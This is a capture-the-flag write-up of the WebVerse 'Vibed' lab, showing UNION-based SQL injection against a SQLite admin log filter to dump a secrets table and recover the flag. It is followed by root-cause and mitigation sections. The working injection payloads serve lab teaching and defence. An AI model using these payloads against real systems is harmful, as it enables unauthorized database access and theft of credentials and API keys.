---
title: "SQL Injection – Secret Extraction from Internal Logs Console | Vibed"
date: 2026-05-21 22:05:00 +0530
categories: [A05 - Injection, SQL Injection]
tags: [sqli, union-based-sqli, sqlite, sensitive-data-exposure, database-enumeration, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/vibed.webp
  alt: Vibed WebVerse challenge
---

# Lab Link

https://dashboard.webverselabs-pro.com/mystery-challenges/vibed

# Overview

The **Vibed** challenge demonstrates a classic **SQL Injection** vulnerability within an internal administrative log filtering functionality.

The application contained an administrative logs console used for filtering and reviewing platform events. The developer assumed the endpoint was "internal-only" and therefore omitted parameterized database queries.

Because user input was directly concatenated into SQL statements, arbitrary SQL execution became possible.

Using **UNION-based SQL injection**, database metadata was enumerated, sensitive tables were identified, and internal platform secrets were extracted from the database.

# Objective

Exploit the vulnerable logs filter to extract the platform bootstrap token and obtain the flag.

# Vulnerability Classification Hierarchy

```text
OWASP Category
└── A05: Injection
    └── SQL Injection
        └── UNION-Based SQL Injection
            └── Unsanitized User Input in SQL Query
```

# Reconnaissance

The vulnerable endpoint was available at:

```text
https://5a36a9d1-4065-vibed-c08ce.events.webverselabs-pro.com/admin/logs
```

Since the challenge description hinted that the logs filter did not sanitize input, testing began with a basic SQL injection payload.

Initial payload:

```sql
' or 1=1-- -
```

The application behavior changed and returned additional results, confirming that input was being interpreted inside a SQL query.

This verified the presence of SQL injection.

# Column Enumeration

For a UNION attack to work, the number of columns in the original query must match the injected query.

Enumeration was performed using:

```sql
' order by 5-- -
```

The query succeeded.

Increasing further caused failure, indicating:

```text
Number of columns = 5
```

# Database Enumeration

SQLite stores metadata inside:

```text
sqlite_master
```

The following payload was used to enumerate database tables:

```sql
' UNION SELECT 1,name,3,4,5
FROM sqlite_master
WHERE type='table'--
```

Response revealed several tables:

```text
models
request_logs
secrets
workspaces
```

Among these, the most interesting target was:

```text
secrets
```

# Exploitation

To retrieve sensitive values from the identified table:

```sql
' UNION SELECT
1,
name||'::'||value,
rotated_at,
4,
5
FROM secrets--
```

This concatenated secret names and values together for easier viewing.

# Proof of Exploitation

The application returned sensitive entries:

```text
google_api_key::

hmac_signing_key::

openai_api_key::
sk-proj-redacted-by-vault-policy

platform_bootstrap_token::
WEBVERSE{.....}

stripe_publishable_key::
```

The bootstrap token was successfully extracted.

Flag:

```text
WEBVERSE{.....}
```

# Root Cause

The application likely constructed SQL statements similar to:

```sql
SELECT *
FROM request_logs
WHERE filter='$input'
```

When user input became:

```sql
' OR 1=1-- -
```

the query effectively transformed into:

```sql
SELECT *
FROM request_logs
WHERE filter='' OR 1=1
```

Because input was inserted directly into SQL statements, attackers could modify query logic and execute arbitrary database operations.

# Impact

In real-world environments this vulnerability can lead to:

- Database disclosure
- Credential exposure
- API key theft
- Authentication bypass
- Administrative compromise
- Internal secret extraction
- Remote code execution in chained attacks

In this case the impact included exposure of:

- Platform bootstrap token
- Internal API credentials
- Signing secrets
- Third-party integration keys

# Mitigation

## Use parameterized queries

Bad:

```sql
query = "SELECT * FROM logs WHERE filter='" + userInput + "'"
```

Secure:

```python
cursor.execute(
    "SELECT * FROM logs WHERE filter=?",
    (userInput,)
)
```

## Apply least privilege

Database accounts should only have permissions required for operation.

Administrative tables containing secrets should not be readable by general application components.

## Separate secrets from application databases

Sensitive values should be stored in:

```text
Vault
KMS
Secret Manager
Environment variables
```

rather than application tables.

## Perform input validation

Restrict accepted values whenever possible.

## Never assume internal systems are safe

A frequent mistake:

```text
Internal only = secure
```

Internal applications are frequently targeted during real-world assessments.

# Real-World Insight

SQL injection continues to appear because developers often make assumptions such as:

```text
"This page is only used internally."
```

or

```text
"No attacker can access this endpoint."
```

Attackers routinely target:

- Internal admin panels
- Monitoring systems
- Log viewers
- Reporting dashboards
- Debug functionality

These systems often receive less security review than public-facing applications, making them attractive targets during penetration tests.